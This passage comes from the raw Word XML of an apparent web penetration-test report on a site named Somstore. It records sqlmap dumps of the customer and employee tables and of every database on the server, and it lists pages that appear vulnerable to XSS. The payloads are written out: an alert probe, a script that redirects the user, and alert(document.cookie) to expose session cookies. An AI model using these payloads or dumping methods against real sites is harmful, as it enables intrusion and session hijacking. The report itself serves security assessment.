      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - employee table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243AF7F1" w14:textId="47C17198" w:rsidR="00B14C2C" w:rsidRDefault="0084535E" w:rsidP="00B14C2C">
      <w:r>
        <w:t xml:space="preserve">The customer table was also dumped using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. This is seen in figure 28.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B15EBE" w14:textId="5DB9B4C6" w:rsidR="0084535E" w:rsidRDefault="0084535E" w:rsidP="0084535E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57994FA2" wp14:editId="032ABD30">
            <wp:extent cx="6583436" cy="790575"/>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87312" cy="791040"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDB8321" w14:textId="51CD6BB8" w:rsidR="00B05727" w:rsidRDefault="0084535E" w:rsidP="00B372B0">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28</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Customer Table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B12F954" w14:textId="4C3757F3" w:rsidR="00B372B0" w:rsidRDefault="00B372B0" w:rsidP="00B372B0">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>From this information, an attacker can gain admin and user accounts on the website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0235D4A1" w14:textId="66D12973" w:rsidR="00E60461" w:rsidRDefault="00D765D5" w:rsidP="00B372B0">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All of </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he datab</w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ses on the server were </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>dumped, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> can be seen in figure 29. </w:t>
      </w:r>
      <w:r w:rsidR="00E60461">
        <w:t xml:space="preserve">When all databases on the server were dumped, it was found that more than just the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E60461">
        <w:t>Somstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E60461">
        <w:t xml:space="preserve"> database was running. This suggests that other websites are running on the same server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D9A58B" w14:textId="77777777" w:rsidR="00C31055" w:rsidRDefault="00C31055" w:rsidP="00C31055">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3DB10342" wp14:editId="3C0E2AD1">
            <wp:extent cx="5943600" cy="28651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65120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E57334F" w14:textId="547932DD" w:rsidR="00D765D5" w:rsidRDefault="00C31055" w:rsidP="00C31055">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00D61A4D">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>29</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - databases on the server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752CC548" w14:textId="77777777" w:rsidR="00D765D5" w:rsidRDefault="00D765D5" w:rsidP="00B372B0">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05681E6F" w14:textId="77777777" w:rsidR="00B372B0" w:rsidRPr="00B372B0" w:rsidRDefault="00B372B0" w:rsidP="00B372B0"/>
    <w:p w14:paraId="701C7CA1" w14:textId="47D0022C" w:rsidR="007520A7" w:rsidRPr="007C3AFD" w:rsidRDefault="00BB339B" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc531104352"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>Test for XSS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="3910084F" w14:textId="4BDC93D4" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:r>
        <w:t xml:space="preserve">Using burp Intruder, the payload </w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t>‘</w:t>
      </w:r>
      <w:r w:rsidRPr="006B799B">
        <w:t>&lt;script&gt;alert("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>")&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>/script&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t>used</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to test for XSS</w:t>
      </w:r>
      <w:r w:rsidR="00B75338">
        <w:t xml:space="preserve"> against all pages that allowed user input</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BA08FD" w14:textId="50F678BB" w:rsidR="007520A7" w:rsidRDefault="007C3AFD" w:rsidP="007520A7">
      <w:r>
        <w:t xml:space="preserve">The results from </w:t>
      </w:r>
      <w:r w:rsidR="007520A7">
        <w:t xml:space="preserve">Burp intruder indicated that the following pages could be vulnerable: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5495A0FD" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1187">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1187">
        <w:t>feedback_process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0B4DE507" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1187">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1187">
        <w:t>InsertPayment.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4657EC39" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1187">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1187">
        <w:t>empRegistration.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="360E26C4" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
        <w:t>insertProduct.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="57F201CC" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
        <w:t>insertWarehouse.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="50E5C546" w14:textId="2E589FA2" w:rsidR="007520A7" w:rsidRPr="007520A7" w:rsidRDefault="007520A7" w:rsidP="007520A7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
        <w:t>insertCategory.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="340EBAD5" w14:textId="77777777" w:rsidR="007C3AFD" w:rsidRDefault="006B799B" w:rsidP="00BB339B">
      <w:r>
        <w:t>The /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>feedback_process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve">page </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">will be tested </w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t>for XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. By going on to the contact us page, the string </w:t>
      </w:r>
      <w:r w:rsidRPr="006B799B">
        <w:t>&lt;script&gt;alert("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>")&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B799B">
        <w:t>/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was inserted individually into each form field. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73952C24" w14:textId="4DEB5DB4" w:rsidR="00E85811" w:rsidRDefault="00CC5225" w:rsidP="00BB339B">
      <w:r>
        <w:t xml:space="preserve">Upon testing, </w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t xml:space="preserve">all fields rejected the script, except for the “name” field. </w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t>This</w:t>
      </w:r>
      <w:r w:rsidR="00E85811">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve">type of XSS is </w:t>
      </w:r>
      <w:r w:rsidR="00E85811">
        <w:t xml:space="preserve">reflective, as </w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve">the script will only run once. If </w:t>
      </w:r>
      <w:r w:rsidR="003264CE">
        <w:t>a new request was made to the</w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00DE3E0E">
        <w:t>page</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve"> then the script would not run again.</w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t xml:space="preserve"> Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>30</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve"> shows the alert box being displayed on the thank you page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F2749F" w14:textId="77777777" w:rsidR="00E1329A" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18DBAC3C" wp14:editId="72269133">
            <wp:extent cx="5943600" cy="15963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596390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1034751A" w14:textId="43653D24" w:rsidR="00E1329A" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">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30</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA771CB" w14:textId="41FD61ED" w:rsidR="00E1329A" w:rsidRPr="000547A2" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">
      <w:r>
        <w:t>To test if user redirection is possible through the contact us page, the following script was inserted into the name field:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000547A2">
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>setTimeout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>function(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C52E3F" w14:textId="77777777" w:rsidR="00E1329A" w:rsidRPr="000547A2" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="000547A2">
        <w:t>  </w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>window.location</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000547A2">
        <w:t>.href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000547A2">
        <w:t xml:space="preserve"> = "https://www.</w:t>
      </w:r>
      <w:r>
        <w:t>google</w:t>
      </w:r>
      <w:r w:rsidRPr="000547A2">
        <w:t>.com"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000547A2">
        <w:t>}, 3000);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383E85AD" w14:textId="5D1965FE" w:rsidR="00E1329A" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="000547A2">
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326A9AE4" w14:textId="77777777" w:rsidR="00E1329A" w:rsidRDefault="00E1329A" w:rsidP="00E1329A">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3575ABFD" w14:textId="7422A84C" w:rsidR="00E1329A" w:rsidRDefault="00B372B0" w:rsidP="00BB339B">
      <w:r>
        <w:t>When the form was submitted</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve"> it took the user to the thank you</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> page, then after three seconds</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve"> redirected the user to the google homepage</w:t>
      </w:r>
      <w:r w:rsidR="00B75338">
        <w:t>. This proves that</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve"> user redirection through XSS is possible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120D7012" w14:textId="5D29F8AB" w:rsidR="00B11DF0" w:rsidRDefault="00B11DF0" w:rsidP="00BB339B">
      <w:r>
        <w:t>By inserting the script, “</w:t>
      </w:r>
      <w:r w:rsidRPr="00B11DF0">
        <w:t>&lt;script&gt;alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B11DF0">
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B11DF0">
        <w:t>)&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">”, the user PHPSESSID cookie, and secret cookie are displayed in an alert message. If a malicious hacker can obtain these details, then </w:t>
      </w:r>
      <w:r w:rsidR="005E0D68">
        <w:t>session hijacking can be performed</w:t>
      </w:r>
      <w:r>
        <w:t>, as seen in Section 2.5.1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52579251" w14:textId="709EF023" w:rsidR="00DE3E0E" w:rsidRDefault="00DF2408" w:rsidP="00BB339B">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00FD5236">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>InsertPayment.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page is</w:t>
      </w:r>
      <w:r w:rsidR="00DE3E0E">
        <w:t xml:space="preserve"> also</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerable to XSS. Upon entering the script into every form field, it was found that the</w:t>
      </w:r>
      <w:r w:rsidR="00381DF2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FD5236">
        <w:t xml:space="preserve">“Address”, “Country”, “City” and “Phone” fields accepted the JavaScript input. However, </w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t>the script only runs when an admin logs in and views the “</w:t>
      </w:r>
      <w:r w:rsidR="00D612CD">
        <w:t>Order</w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:t xml:space="preserve"> Details” section. </w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>31</w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t xml:space="preserve"> and 3</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve">1 show the alert </w:t>
      </w:r>
      <w:r w:rsidR="00B372B0">
        <w:t>script, with different messages</w:t>
      </w:r>
      <w:r w:rsidR="00E1329A">
        <w:t xml:space="preserve"> being injected and run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E3C0B4" w14:textId="66D57881" w:rsidR="00AF66AD" w:rsidRDefault="00B75338" w:rsidP="00AF66AD">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251667456" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="33A9692B" wp14:editId="4C9D45F7">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-180975</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>234950</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5876925" cy="3971925"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21548"/>
                <wp:lineTo x="21565" y="21548"/>
                <wp:lineTo x="2156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876925" cy="3971925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCED167" w14:textId="1A5046EF" w:rsidR="00E1329A" w:rsidRDefault="00AF66AD" w:rsidP="00AF66AD">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31</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - XSS Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609CCB3F" w14:textId="41D343B0" w:rsidR="00AF66AD" w:rsidRDefault="00AF66AD" w:rsidP="00AF66AD"/>
    <w:p w14:paraId="7B204DC2" w14:textId="4F96B62F" w:rsidR="00AF66AD" w:rsidRPr="00AF66AD" w:rsidRDefault="00AF66AD" w:rsidP="00AF66AD"/>
    <w:p w14:paraId="3F2BDEEE" w14:textId="0422A011" w:rsidR="00AF66AD" w:rsidRDefault="00AF66AD" w:rsidP="00AF66AD"/>
    <w:p w14:paraId="0440701E" w14:textId="1D459FCB" w:rsidR="00AF66AD" w:rsidRPr="00AF66AD" w:rsidRDefault="00AF66AD" w:rsidP="00AF66AD">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="721CA73F" wp14:editId="4891F90F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4987925</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5943600"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9CC3E2C" w14:textId="2734094D" w:rsidR="00EA689B" w:rsidRPr="001836E8" w:rsidRDefault="00EA689B" w:rsidP="00AF66AD">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t>- XSS alerts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CA73F" id="Text Box 56" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:392.75pt;width:46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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="69CC3E2C" w14:textId="2734094D" w:rsidR="00EA689B" w:rsidRPr="001836E8" w:rsidRDefault="00EA689B" w:rsidP="00AF66AD">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t>- XSS alerts</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="tight"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpg">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1EB82453" wp14:editId="230C969B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>right</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>381000</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5943600" cy="4549775"/>
                <wp:effectExtent l="0" t="0" r="0" b="3175"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="21525"/>
                    <wp:lineTo x="21531" y="21525"/>
                    <wp:lineTo x="21531"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5943600" cy="4549775"/>
                          <a:chOff x="0" y="0"/>
                          <a:chExt cx="5943600" cy="4549775"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="50" name="Picture 5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1140460"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="51" name="Picture 5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1123950"/>
                            <a:ext cx="5943600" cy="1125220"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="52" name="Picture 5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2247900"/>
                            <a:ext cx="5943600" cy="1145540"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="53" name="Picture 5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3381375"/>
                            <a:ext cx="5943600" cy="1168400"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </wpg:wgp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:group w14:anchorId="35C3AF7E" id="Group 55" o:spid="_x0000_s1026" style="position:absolute;margin-left:416.8pt;margin-top:30pt;width:468pt;height:358.25pt;z-index:251664384;mso-position-horizontal:right;mso-position-horizontal-relative:margin" coordsize="59436,45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width:59436;height:1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">
                  <v:imagedata r:id="rId92" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <v:shape id="Picture 51" o:spid="_x0000_s1028" type="#_x0000_t75" style="position:absolute;top:11239;width:59436;height:1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">
                  <v:imagedata r:id="rId93" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <v:shape id="Picture 52" o:spid="_x0000_s1029" type="#_x0000_t75" style="position:absolute;top:22479;width:59436;height:11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">
                  <v:imagedata r:id="rId94" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <v:shape id="Picture 53" o:spid="_x0000_s1030" type="#_x0000_t75" style="position:absolute;top:33813;width:59436;height:1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">
                  <v:imagedata r:id="rId95" o:title=""/>
                  <v:path arrowok="t"/>
                </v:shape>
                <w10:wrap type="tight" anchorx="margin"/>
              </v:group>
